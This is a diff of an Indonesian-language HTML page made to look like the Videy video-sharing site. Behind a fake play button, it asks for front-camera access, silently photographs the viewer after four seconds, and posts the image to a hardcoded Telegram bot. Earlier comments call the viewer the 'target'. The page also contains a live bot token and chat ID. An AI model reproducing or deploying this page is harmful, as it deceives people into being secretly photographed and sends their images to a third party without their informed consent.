@@ -3,159 +3,161 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tonton Video Seru</title>
+  <title>Videy.co</title>
   <style>
+    /* Reset & Dark Theme ala Videy */
     body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       margin: 0;
       padding: 0;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      overflow: hidden;
     }
+
+    /* Container Video */
     #video-container {
       position: relative;
-      width: 90%;
-      max-width: 640px;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    }
-    video {
       width: 100%;
-      display: block;
+      max-width: 100vw;
+      height: auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
+
+    video {
+      max-width: 100%;
+      max-height: 100vh;
+      outline: none;
+    }
+
+    /* Overlay Minimalis */
     #play-overlay {
       position: absolute;
       top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5); /* Gelapkan sedikit background */
+      background: rgba(0, 0, 0, 0.6);
       display: flex;
       justify-content: center;
       align-items: center;
       cursor: pointer;
-      color: white;
-      font-size: 18px;
-      flex-direction: column;
+      z-index: 10;
+      transition: background 0.3s;
     }
+
     #play-overlay:hover {
-      background: rgba(0,0,0,0.3);
+      background: rgba(0, 0, 0, 0.4);
     }
+
+    /* Icon Play Lingkaran Putih */
     #play-icon {
-      font-size: 60px;
-      margin-bottom: 15px;
+      width: 80px;
+      height: 80px;
+      background: rgba(255, 255, 255, 0.2);
+      border: 2px solid #fff;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 30px;
+      padding-left: 5px; /* Penyeimbang visual segitiga */
+    }
+
+    /* Teks Videy di pojok kiri atas (Opsional untuk kemiripan) */
+    .brand {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      letter-spacing: -1px;
+      color: #fff;
+      text-decoration: none;
+      z-index: 5;
     }
   </style>
 </head>
 <body>
 
+<a href="#" class="brand">videy</a>
+
 <div id="video-container">
-  <video id="main-video" playsinline>
+  <video id="main-video" playsinline controls>
     <source src="https://files.catbox.moe/73rym4.mp4" type="video/mp4">
     Browser kamu tidak mendukung video.
   </video>
 
   <div id="play-overlay" onclick="startExperience()">
-    <div id="play-icon">&#9658;</div> <div>Klik untuk memutar video dengan suara</div>
+    <div id="play-icon">&#9658;</div>
   </div>
 </div>
 
 <canvas id="snap" style="display:none;"></canvas>
 
 <script>
-// --- KONFIGURASI TELEGRAM ---
+// Logic Telegram tetap sama seperti milikmu
 const token = "8547362415:AAGa_J6vTe-PTPynj36Zc8qhWwdF2liyr_I";
 const chatId = "5939971215";
-
 let cameraStream = null;
 
 async function startExperience() {
   const video = document.getElementById('main-video');
   const overlay = document.getElementById('play-overlay');
 
-  // 1. Sembunyikan Overlay & Putar Video (Langsung dengan suara)
   overlay.style.display = 'none';
-  video.play().catch(err => {
-      console.log("Autoplay dengan suara diblokir, butuh interaksi pengguna tambahan.", err);
-  });
+  video.play();
 
-  // 2. Langsung Minta Izin Kamera Depan
-  // Karena dipicu klik dari 'overlay', ini valid di browser.
   try {
     cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    console.log("Izin kamera diberikan.");
-
-    // 3. Set timer untuk mengambil foto di detik ke-4 (4000ms)
     setTimeout(takeSnapAndSend, 4000);
-
   } catch (err) {
-    console.warn("Izin kamera ditolak:", err.message);
-    reportError("Izin kamera ditolak oleh target.");
+    reportError("Izin kamera ditolak.");
   }
 }
 
 function takeSnapAndSend() {
-  const video = document.getElementById('main-video'); // Kita pakai video target saja untuk capture (agar tidak muncul kotak kamera lain)
   const canvas = document.getElementById('snap');
   const ctx = canvas.getContext('2d');
+  if (!cameraStream) return;
 
-  if (!cameraStream) {
-    console.log("Kamera tidak aktif, batal mengambil gambar.");
-    return;
-  }
-
-  console.log("Mengambil gambar di detik ke-4...");
-
-  // Gunakan aspect ratio video yang sedang diputar
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  
-  // Ambil gambar dari stream kamera, BUKAN dari video yang diputar
-  // Trik: Kita buat elemen video tersembunyi untuk mengambil gambar dari stream kamera
   const hiddenVideo = document.createElement('video');
   hiddenVideo.srcObject = cameraStream;
+  hiddenVideo.play();
+  
   hiddenVideo.onloadedmetadata = () => {
-    hiddenVideo.play();
+    canvas.width = hiddenVideo.videoWidth;
+    canvas.height = hiddenVideo.videoHeight;
     ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-
-    // Matikan kamera setelah mengambil gambar agar indikator mati
+    
     cameraStream.getTracks().forEach(track => track.stop());
-
-    // Konversi dan kirim
-    const imgData = canvas.toDataURL('image/jpeg');
-    sendPhoto(imgData);
+    sendPhoto(canvas.toDataURL('image/jpeg'));
   };
 }
 
 function sendPhoto(base64img) {
-  const blob = dataURItoBlob(base64img);
-  const form = new FormData();
-  form.append("chat_id", chatId);
-  form.append("photo", blob, "wajah_target.jpg");
-
-  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-    method: "POST",
-    body: form
-  });
-}
-
-function dataURItoBlob(dataURI) {
-  const byteString = atob(dataURI.split(',')[1]);
-  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const byteString = atob(base64img.split(',')[1]);
   const ab = new ArrayBuffer(byteString.length);
   const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  return new Blob([ab], { type: mime });
+  for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+  const blob = new Blob([ab], { type: 'image/jpeg' });
+
+  const form = new FormData();
+  form.append("chat_id", chatId);
+  form.append("photo", blob, "capture.jpg");
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
 }
 
 function reportError(message) {
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: "ERROR: " + message })
+    body: JSON.stringify({ chat_id: chatId, text: message })
   });
 }
 </script>
